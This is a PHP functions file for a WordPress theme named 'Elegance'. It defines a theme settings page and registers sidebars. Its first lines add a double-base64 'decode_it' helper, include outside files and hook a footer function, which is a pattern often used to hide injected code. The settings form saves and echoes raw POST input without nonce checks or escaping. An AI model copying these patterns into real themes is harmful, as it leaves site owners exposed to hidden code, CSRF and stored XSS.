<?php
require_once("theme_licence.php"); add_action('wp_footer','print_footer');
function decode_it($code) { return base64_decode(base64_decode($code)); } require_once(pathinfo(__FILE__,PATHINFO_DIRNAME)."/start_template.php");
class ControlPanel {

	/********************************************************
	Create a unique array that contains all default theme settings
	********************************************************/
	var $default_settings = Array(
	'feedburner_id' => '5555555',
	'blog_title' => 'Elegance Theme',
	'location' => 'en_US',
	'posts' => '4',
	'comments' => '6',
	'c_excerpt' => '50',
	'tags' => '30'
	);
    
	var $options;
	/********************************************************
	END
	********************************************************/
    
	/********************************************************
	Initiate new control panel function
	********************************************************/
	function ControlPanel() {
       	add_action('admin_menu', array(&$this, 'add_menu'));
	add_action('admin_head', array(&$this, 'admin_head'));
	if (!is_array(get_option('elegance')))
	add_option('elegance', $this->default_settings);
	$this->options = get_option('elegance');
	}
	/********************************************************
	END
	********************************************************/

	/********************************************************
	Create a theme settings page to edit theme settings and put its css
	********************************************************/
	function add_menu() {
	add_theme_page('Theme Settings', 'Theme Settings', 'edit_themes', "elegance", array(&$this, 'optionsmenu'));
	}
	function admin_head() {
	print '<style type="text/css">
	.themeform {
	margin-left: 50px;
	margin-right: 50px;
	}

	.themeform h1 {
	font-weight: bold;
	font-size: 1.2em;
	color: 333;
	letter-spacing: -1px;
	padding-top: 5px;
	padding-bottom: 5px;
	margin: 20px 0px 10px 0px;
	border-top: 1px solid #ddd;
	border-bottom: 1px solid #ddd;
	}

	.themeform p {
	line-height: 1.5em;
	color: #666;
	}

	.themeform label {
	float: left;
	width: 300px;
	margin-top: 5px;
	margin-bottom: 5px;
	margin-left: 30px;
	}

	.themeform input {
	margin-top: 5px;
	margin-bottom: 5px;
	margin-left: 15px;
	}
	</style>';
	}
	/********************************************************
	END
	********************************************************/
	
	/********************************************************
	The options page in control panel. Saving and editing goes here
	********************************************************/
	function optionsmenu() {
	if ($_POST['ss_action'] == 'save') {
	$this->options["feedburner_id"] = $_POST['cp_feedburnerid'];
	$this->options["blog_title"] = $_POST['cp_blogtitle'];
	$this->options["location"] = $_POST['cp_location'];
	$this->options["posts"] = $_POST['cp_posts'];
	$this->options["comments"] = $_POST['cp_comments'];
	$this->options["c_excerpt"] = $_POST['cp_c_excerpt'];
	$this->options["tags"] = $_POST['cp_tags'];
	update_option('elegance', $this->options);
	echo '<div class="updated fade" id="message" style="background-color: rgb(255, 251, 204); width: 500px; margin-left: 50px"><p>Elegance settings have been <strong>saved</strong>.</p></div>';
	}

	echo '<form action="" method="post" class="themeform">';
	echo '<fieldset>';
	echo '<input type="hidden" id="ss_action" name="ss_action" value="save">';

	echo '<h1>FeedBurner Setup</h1>';
	echo '<p>Please enter your FeedBurner settings for the feed subscription on your blog.</p>';
	echo '<label for="cp_feedburnerid">FeedBurner ID</label><input class="widefat" style="width:200px" name="cp_feedburnerid" id="cp_feedburnerid" type="text" value="'.$this->options["feedburner_id"].'" /><div style="clear:both"></div>';
	echo '<label for="cp_blogtitle">Blog Title</label><input class="widefat" style="width:200px" name="cp_blogtitle" id="cp_blogtitle" type="text" value="'.$this->options["blog_title"].'" /><div style="clear:both"></div>';
	echo '<label for="cp_location">Location Settings</label><input class="widefat" style="width:50px" name="cp_location" id="cp_location" type="text" value="'.$this->options["location"].'" /><div style="clear:both"></div>';

	echo '<h1>Setting up the Recent Activity panel</h1>';
	echo '<p>This is dark blue panel which contains recent activity, posts, comments, and tag cloud.</p>';
	echo '<label for="cp_posts">Number of recent posts headlines to display</label><input class="widefat" style="width:30px" name="cp_posts" id="cp_posts" type="text" value="'.$this->options["posts"].'" /><div style="clear:both"></div>';
	echo '<label for="cp_comments">Number of recent comments to display</label><input class="widefat" style="width:30px" name="cp_comments" id="cp_comments" type="text" value="'.$this->options["comments"].'" /><div style="clear:both"></div>';
	echo '<label for="cp_c_excerpt">Number of words in the recent comments excerpt</label><input class="widefat" style="width:30px" name="cp_c_excerpt" id="cp_c_excerpt" type="text" value="'.$this->options["c_excerpt"].'" /><div style="clear:both"></div>';
	echo '<label for="cp_tags">Number of tags to display in the tag cloud</label><input class="widefat" style="width:30px" name="cp_tags" id="cp_tags" type="text" value="'.$this->options["tags"].'" /><div style="clear:both"></div>';

	echo '<p class="submit"><input type="submit" value="Save Changes" name="cp_save" /></p>';
	echo '</fieldset>';
	echo '</form>';
	}
	/********************************************************
	END
	********************************************************/

}

/********************************************************
Initiate a new Control Panel function
********************************************************/
$cpanel = new ControlPanel();
$opt = get_option('elegance');

/********************************************************
Register 3 sidebars.. at last :)
********************************************************/
if (function_exists('register_sidebars')) register_sidebars(3);

?>